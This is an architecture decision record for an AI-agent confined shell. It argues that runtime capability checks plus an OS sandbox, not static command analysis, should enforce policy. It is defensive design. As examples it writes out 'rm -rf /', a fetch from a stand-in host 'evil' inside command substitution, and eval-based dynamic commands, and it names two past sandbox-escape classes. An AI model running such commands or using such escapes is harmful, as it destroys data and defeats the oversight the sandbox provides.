# ADR 0001 — Command decomposition and the object-capability enforcement layers

> **Amended by ADR 0005** (2026-06-24): L2 runtime interception is reframed from
> *authoritative* to *convenience*; the object-capability **boundary is L3**. The
> three-layer model below stands; what moves is where the guarantee rests.

- Status: Accepted
- Date: 2026-06-03
- Context: agent-bridle confined shell (`agent-bridle-tool-shell`), `agent-bridle-core` Caveats gate

## Question

Can bridle/ocap handle *compound* commands (`a && b`, `a | b`, `$(…)`, `(…)`,
`for/while/if`, functions, `eval`, redirections) better than it does now — by
**interrogating the decomposition** of the command and **judging whether a deep
interior node is compliant** before/while it runs?

## Background — what "now" does

Today's model is **runtime interception at the leaf**. brush parses the command
into an AST and executes it; when execution *reaches* an external spawn
(`before_exec`) or a file open (`before_open`), the bridle interceptor fires and
checks the operation against the session `Caveats`.

A consequence that is easy to miss: this is already **depth-agnostic**. A command
buried inside `$(…)` inside a `for` inside an `if` *is* checked — because the
check happens when that leaf actually executes, regardless of nesting depth.
**Depth is not the gap.**

The real limits of the runtime-only model are:

1. **No up-front verdict.** It runs until the first violation, so
   `mkdir ok && rm -rf /` runs `mkdir ok` before denying `rm` — partial side
   effects.
2. **No structured explanation.** You get "denied at first violation," not a
   tree-shaped account of which nodes are (non)compliant.
3. **No structural policy.** "Forbid `eval`," "no command substitution," "max
   pipeline depth," "no redirections to absolute paths" are awkward to express
   as per-leaf runtime checks.
4. **No coverage of an external program's interior.** Once a permitted binary
   spawns, brush cannot see its syscalls (the Landlock gap — see ADR threat
   model in `DESIGN.md` §6).

## What static decomposition can and cannot do

`brush-parser` yields the AST, so bridle *can* walk the tree and classify every
node. For **statically-knowable interiors** (literal command names, literal
paths) it can decide compliance at any depth, which buys (1)–(3) above.

But there is a hard wall, and it is **not** a tooling gap — it is
**undecidability**. The shell is dynamic and Turing-complete:

```
eval "$x"        $(curl evil)        sh -c "$VAR"        cmd=$(pick); $cmd
```

The interior of `eval "$(…)"` does not exist until runtime. A static decomposer
cannot soundly determine whether such a deep interior is compliant. If it
*guesses* "compliant," it has created a **false-confidence bypass** — and that is
precisely the class of bug our adversarial audits keep finding: the
`exec`-builtin bypass and the dangling-symlink write escape were both cases of
**the structural/expected view diverging from runtime reality.** Therefore a
static pass must treat every dynamic node as **opaque → defer to runtime**, and
must **never** mark it "compliant."

## The ocap stance — attenuate, don't predict

Object-capability security deliberately **rejects behaviour-prediction** as the
basis of safety, because predicting what dynamic code will do is unreliable (the
confused-deputy / "the code cannot know its own contingency" problem). It instead
enforces **at the point of use, with an unforgeable, already-attenuated
capability.**

So the most ocap-faithful improvement to compound-command handling is **not** a
smarter analyzer. It is to **attenuate the capability** so that a deep, opaque
interior *cannot do harm regardless of what it turns out to be*:
`exec: only{git}, fs_write: only{/work}, net: none, max_calls: 5`. You do not
need to understand `eval "$x"` if `x` cannot reach anything dangerous.

## Decision — a three-layer model

bridle enforces in three layers. The **authoritative** layer is runtime
interception; static decomposition is an additive layer and is never sufficient
on its own.

- **L1 — static preflight decomposition (additive; admission / UX / policy).**
  Walk the `brush-parser` AST. Classify each node: *statically-knowable* vs
  *dynamic/opaque*. Use this for: fail-fast **atomic admission** (reject a command
  with an obviously non-compliant statically-known node *before* any side
  effect), an **explainable decomposition** for the agent/operator, and
  **structural policy**. Dynamic nodes are marked **opaque → defer to L2**, never
  cleared. L1 reduces partial side effects and improves explainability; it does
  not, and cannot, decide soundness.

- **L2 — runtime interception (authoritative; what we have today).** Every actual
  spawn/open is checked against the unforgeable, attenuated `Caveats` at the point
  of use. Depth-agnostic. This is the ground truth.

- **L3 — OS-level sandbox (backstop; Landlock / seccomp).** The only layer that
  confines a *permitted external program's* own syscalls — what neither L1 nor L2
  can see once a binary runs. Currently a P0 no-op; this ADR raises its priority,
  because the threat model shows `fs_*` Caveats do not confine an `exec`-permitted
  program until L3 lands.

### The genuinely "better" version of the idea: per-node sub-attenuation

There is a model richer than a static yes/no, and it is deeply ocap: **decompose
the compound command, then run different interior nodes under different,
*further-attenuated* capabilities.** In `producer | consumer`, give `producer`
read-only and `consumer` write-only; run a `$(…)` substitution under a capability
stripped of `fs_write`. This is "handling compound commands better" in the truest
sense — not predicting the interior, but **scoping authority per interior node** —
bounded by the same rule: a node that cannot be statically resolved gets the
**least** authority, never the benefit of the doubt.

## Consequences

- The runtime-interception model is kept as the authoritative enforcer and is
  acknowledged as already depth-complete for what executes.
- Static decomposition (L1) is a future, additive increment for admission /
  explainability / structural policy, with a strict rule: **dynamic node ⇒
  opaque ⇒ defer; never "compliant."**
- Per-node sub-attenuation is the long-term "smarter compound-command" direction,
  preferred over command analysis.
- Landlock (L3) is reprioritised: it is the only confinement for external
  programs' interiors, so the strength of the fs leash today rests on the `exec`
  scope plus L3.
- Safety claims are made per layer; no layer's verdict is allowed to override a
  more authoritative layer (L1 cannot clear what L2/L3 would deny).

## Alternatives considered

- **Static analysis as the authoritative gate.** Rejected: undecidable for a
  dynamic, Turing-complete shell; produces false-confidence bypasses (evidenced
  by the audit findings above).
- **Prompt hygiene / asking the model not to do bad things.** Rejected: not an
  enforcement boundary; the confused-deputy gap is closed structurally or not at
  all.
- **Runtime interception only (status quo).** Kept as L2, but augmented: it lacks
  atomic admission, explainability, structural policy, and external-program
  coverage, which L1 and L3 add.

## Evidence

The exec-builtin bypass (a builtin reaching `cmd.exec()` outside the spawn
funnel) and the dangling-symlink `fs_write` escape (a check-time canonicalization
that diverged from the runtime `open(2)`) were both found by **adversarial,
empirical** verification — not by structural reasoning. They are the standing
proof that L2 (runtime) and L3 (OS) are necessary and that L1 (static) can never
be trusted alone.
